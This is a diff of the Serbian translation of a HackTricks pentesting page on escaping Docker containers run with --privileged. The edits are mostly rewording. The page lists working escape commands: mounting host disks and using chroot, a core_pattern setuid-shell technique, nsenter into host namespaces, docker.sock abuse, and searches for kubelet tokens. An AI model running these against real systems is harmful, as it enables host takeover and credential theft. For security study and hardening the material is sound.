@@ -1,10 +1,10 @@
-# Bekstvo iz `--privileged` kontejnera
+# Escaping From `--privileged` Containers
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Pregled
 
-Kontejner pokrenut sa `--privileged` nije isto što i običan kontejner sa jednom ili dve dodatne permisije. U praksi, `--privileged` uklanja ili slabi nekoliko podrazumevanih runtime zaštita koje obično drže workload podalje od opasnih host resursa. Tačan efekat i dalje zavisi od runtime-a i hosta, ali za Docker je uobičajeni rezultat:
+Kontejner pokrenut sa `--privileged` nije isto što i običan kontejner sa jednom ili dve dodatne dozvole. U praksi, `--privileged` uklanja ili ublažava nekoliko podrazumevanih runtime zaštita koje obično drže workload podalje od opasnih host resursa. Tačan efekat i dalje zavisi od runtime-a i hosta, ali za Docker uobičajeni rezultat je:
 
 - all capabilities are granted
 - the device cgroup restrictions are lifted
@@ -14,11 +14,11 @@ Kontejner pokrenut sa `--privileged` nije isto što i običan kontejner sa jedno
 - AppArmor confinement is disabled
 - SELinux isolation is disabled or replaced with a much broader label
 
-Važna posledica je da privilegovani kontejner obično **ne** zahteva suptilan kernel exploit. U mnogim slučajevima može jednostavno da komunicira direktno sa host uređajima, host-facing kernel filesystems, ili runtime interfejsima, i zatim pivotira u host shell.
+Važna posledica je da privilegovan kontejner obično NE zahteva suptilan kernel exploit. U mnogim slučajevima može jednostavno direktno komunicirati sa host uređajima, kernel filesystems okrenutim ka hostu, ili runtime interfejsima i zatim pivotirati u host shell.
 
 ## Šta `--privileged` ne menja automatski
 
-`--privileged` does **not** automatically join the host PID, network, IPC, or UTS namespaces. Privilegovani kontejner i dalje može imati privatne namespaces. To znači da neki lanci za bekstvo zahtevaju dodatni uslov kao što su:
+`--privileged` **ne** pridružuje automatski host PID, network, IPC, ili UTS namespaces. Privilegovan kontejner i dalje može imati privatne namespaces. To znači da neke escape lanci zahtevaju dodatni uslov kao što je:
 
 - a host bind mount
 - host PID sharing
@@ -26,13 +26,13 @@ Važna posledica je da privilegovani kontejner obično **ne** zahteva suptilan k
 - visible host devices
 - writable proc/sys interfaces
 
-Ti uslovi su često laki za zadovoljenje u realnim pogrešnim konfiguracijama, ali su konceptualno odvojeni od samog `--privileged`.
+Ti uslovi su često laki za ispuniti kod stvarnih miskonfiguracija, ali su koncepcijski odvojeni od samog `--privileged`.
 
-## Putanje za bekstvo
+## Escape Paths
 
-### 1. Montiranje host diska preko izloženih uređaja
+### 1. Mount The Host Disk Through Exposed Devices
 
-Kontejner pokrenut sa `--privileged` obično vidi znatno više uređajnih čvorova pod `/dev`. Ako je host block device vidljiv, najjednostavniji put bekstva je da ga montirate i `chroot` u host filesystem:
+Privilegovan kontejner obično vidi mnogo više device nodova pod `/dev`. Ako je host block device vidljiv, najjednostavniji način bekstva je da ga mount-ujete i `chroot` u host filesystem:
 ```bash
 ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
 mkdir -p /mnt/hostdisk
@@ -46,15 +46,15 @@ fdisk -l 2>/dev/null
 blkid 2>/dev/null
 debugfs /dev/sda1 2>/dev/null
 ```
-Ako je praktičan pristup da se postavi setuid helper u writable host mount umesto `chroot`, imajte na umu da ne svaki fajl sistem poštuje setuid bit. Brza provera mogućnosti na hostu je:
+Ako je praktičniji pristup da se postavi setuid helper u writable host mount umesto da se koristi `chroot`, imajte na umu da ne svaki filesystem poštuje setuid bit. Brza host-side provera mogućnosti je:
 ```bash
 mount | grep -v "nosuid"
 ```
-Ovo je korisno zato što su upisivi putevi u okviru `nosuid` datotečnih sistema mnogo manje interesantni za klasične "drop a setuid shell and execute it later" tokove rada.
+Ovo je korisno zato što su upisivi putevi na `nosuid` filesystem-ima znatno manje interesantni za klasične "drop a setuid shell and execute it later" radne tokove.
 
 Oslabljene zaštite koje se ovde zloupotrebljavaju su:
 
-- potpuno izlaganje uređaja
+- potpuna izloženost uređaja
 - široke capabilities, posebno `CAP_SYS_ADMIN`
 
 Related pages:
@@ -69,7 +69,7 @@ protections/namespaces/mount-namespace.md
 
 ### 2. Montirajte ili ponovo iskoristite host bind mount i `chroot`
 
-Ako je root datotečni sistem hosta već montiran unutar kontejnera, ili ako kontejner može kreirati neophodne mount tačke zato što je privilegovan, shell hosta je često udaljen samo jedan `chroot`:
+Ako je host root filesystem već montiran unutar kontejnera, ili ako kontejner može da kreira potrebne mount-ove zato što je privilegovan, shell na hostu često je samo jedan `chroot` udaljen:
 ```bash
 mount | grep -E ' /host| /mnt| /rootfs'
 ls -la /host 2>/dev/null
@@ -81,7 +81,7 @@ mkdir -p /tmp/host
 mount --bind / /tmp/host
 chroot /tmp/host /bin/bash 2>/dev/null
 ```
-Ovaj put zloupotrebljava:
+Ovaj pristup zloupotrebljava:
 
 - oslabljena mount ograničenja
 - pune capabilities
@@ -105,9 +105,9 @@ protections/apparmor.md
 protections/selinux.md
 {{#endref}}
 
-### 3. Zloupotreba upisivih `/proc/sys` ili `/sys`
+### 3. Zloupotreba zapisljivog `/proc/sys` ili `/sys`
 
-Jedna od velikih posledica `--privileged` je da zaštite procfs i sysfs postanu znatno slabije. To može otkriti host-facing kernel interfejse koji su normalno maskirani ili montirani samo za čitanje.
+Jedna od velikih posledica `--privileged` je da zaštite procfs i sysfs postanu znatno slabije. To može otkriti kernel interfejse koji su okrenuti ka hostu, a koji su obično maskirani ili montirani kao read-only.
 
 Klasičan primer je `core_pattern`:
 ```bash
@@ -131,7 +131,7 @@ gcc /tmp/crash.c -o /tmp/crash
 /tmp/crash
 ls -l /tmp/rootsh
 ```
-Ostale putanje visokog značaja uključuju:
+Ostali putevi visoke vrednosti uključuju:
 ```bash
 cat /proc/sys/kernel/modprobe 2>/dev/null
 cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
@@ -140,8 +140,8 @@ find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
 Ovaj put zloupotrebljava:
 
-- nedostajuće maskirane putanje
-- nedostajuće sistemske putanje u režimu read-only
+- nedostatak maskiranih putanja
+- nedostatak sistemskih putanja samo za čitanje
 
 Related pages:
 
@@ -153,24 +153,24 @@ protections/masked-paths.md
 protections/read-only-paths.md
 {{#endref}}
 
-### 4. Koristite pune capabilities za Mount- ili Namespace-Based Escape
+### 4. Koristite pune capabilities za mount- ili namespace-based escape
 
-Privilegovan kontejner dobija capabilities koje se obično uklanjaju iz standardnih kontejnera, uključujući `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, i mnoge druge. To je često dovoljno da lokalno uporište postane host escape čim postoji neka druga izložena površina.
+Privilegovani kontejner dobija capabilities koje se obično uklanjaju iz standardnih kontejnera, uključujući `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, i mnoge druge. To je često dovoljno da lokalni pristup pretvori u host escape čim postoji neki drugi izloženi interfejs.
 
-Jednostavan primer je montiranje dodatnih datotečnih sistema i korišćenje namespace entry:
+Jednostavan primer je montiranje dodatnih fajl-sistema i korišćenje ulaska u namespace:
 ```bash
 capsh --print | grep cap_sys_admin
 which nsenter
 nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
 ```
-Ako je host PID takođe podeljen, korak postaje još kraći:
+Ako je PID hosta takođe deljen, korak postaje još kraći:
 ```bash
 ps -ef | head -n 50
 nsenter -t 1 -m -u -n -i -p /bin/bash
 ```
 Ovaj put zloupotrebljava:
 
-- podrazumevani privileged capability set
+- podrazumevani skup privilegovanih capabilities
 - opciono deljenje host PID-a
 
 Related pages:
@@ -183,9 +183,9 @@ protections/capabilities.md
 protections/namespaces/pid-namespace.md
 {{#endref}}
 
-### 5. Bekstvo preko runtime sockets
+### 5. Bekstvo putem runtime soketa
 
-Privileged container često završi tako što su host runtime stanje ili sockets vidljivi. Ako je Docker, containerd, ili CRI-O socket dostupan, najjednostavniji pristup često je koristiti runtime API za pokretanje drugog containera sa host pristupom:
+Privilegovan kontejner često završi sa vidljivim host runtime stanjem ili soketima. Ako je Docker, containerd, ili CRI-O socket dostupan, najjednostavniji pristup često je koristiti runtime API da se pokrene drugi kontejner sa pristupom hostu:
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
@@ -199,7 +199,7 @@ Ovaj put zloupotrebljava:
 - privileged runtime exposure
 - host bind mounts created through the runtime itself
 
-Povezane stranice:
+Related pages:
 
 {{#ref}}
 protections/namespaces/mount-namespace.md
@@ -209,9 +209,9 @@ protections/namespaces/mount-namespace.md
 runtime-api-and-daemon-exposure.md
 {{#endref}}
 
-### 6. Uklanjanje neželjenih efekata mrežne izolacije
+### 6. Uklanjanje sporednih efekata mrežne izolacije
 
-`--privileged` samo po sebi ne pridružuje host network namespace, ali ako kontejner takođe ima `--network=host` ili neki drugi host-network access, čitav network stack postaje promenljiv:
+`--privileged` sam po sebi ne ulazi u host network namespace, ali ako kontejner takođe ima `--network=host` ili drugi host-network pristup, kompletan network stack postaje promenljiv:
 ```bash
 capsh --print | grep cap_net_admin
 ip addr
@@ -232,17 +232,17 @@ protections/capabilities.md
 protections/namespaces/network-namespace.md
 {{#endref}}
 
-### 7. Čitanje host secrets i runtime state
+### 7. Čitanje host tajni i runtime stanja
 
-Čak i kada clean shell escape nije neposredan, privileged containers često imaju dovoljno pristupa da pročitaju host secrets, kubelet state, runtime metadata, i neighboring container filesystems:
+Čak i kada clean shell escape nije neposredan, privileged containers često imaju dovoljno pristupa da pročitaju host secrets, kubelet state, runtime metadata i datotečne sisteme susednih kontejnera:
 ```bash
 find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
 find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
 find /var/lib/containerd -type f 2>/dev/null | head -n 50
 ```
-Ako je `/var` montiran na hostu ili su runtime direktorijumi vidljivi, to može biti dovoljno za lateral movement ili krađu kredencijala za cloud/Kubernetes čak i pre nego što se dobije host shell.
+Ako je `/var` host-mounted ili su runtime direktorijumi vidljivi, to može biti dovoljno za lateral movement ili cloud/Kubernetes credential theft čak i pre nego što se dobije host shell.
 
-Related pages:
+Povezane strane:
 
 {{#ref}}
 protections/namespaces/mount-namespace.md
@@ -265,13 +265,13 @@ find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
 ```
 Šta je ovde zanimljivo:
 
-- puni set capability-ja, posebno `CAP_SYS_ADMIN`
-- izloženost proc/sys sa mogućnošću pisanja
+- potpuni skup capabilities, posebno `CAP_SYS_ADMIN`
+- proc/sys izloženost sa mogućnošću pisanja
 - vidljivi host uređaji
-- nedostatak seccomp i MAC confinement
-- runtime soketi ili host root bind mount-ovi
+- nedostatak seccomp i MAC ograničenja
+- runtime sockets ili host root bind mounts
 
-Bilo koji od ovih može biti dovoljan za post-exploitation. Nekoliko njih zajedno obično znači da je container funkcionalno udaljen jednu ili dve komande od host compromise.
+Bilo koji od ovih može biti dovoljan za post-exploitation. Nekoliko njih zajedno obično znači da je container funkcionalno udaljen jednu ili dve naredbe od kompromitovanja hosta.
 
 ## Povezane stranice
 
@@ -310,3 +310,4 @@ protections/namespaces/pid-namespace.md
 {{#ref}}
 protections/namespaces/network-namespace.md
 {{#endref}}
+{{#include ../../../banners/hacktricks-training.md}}
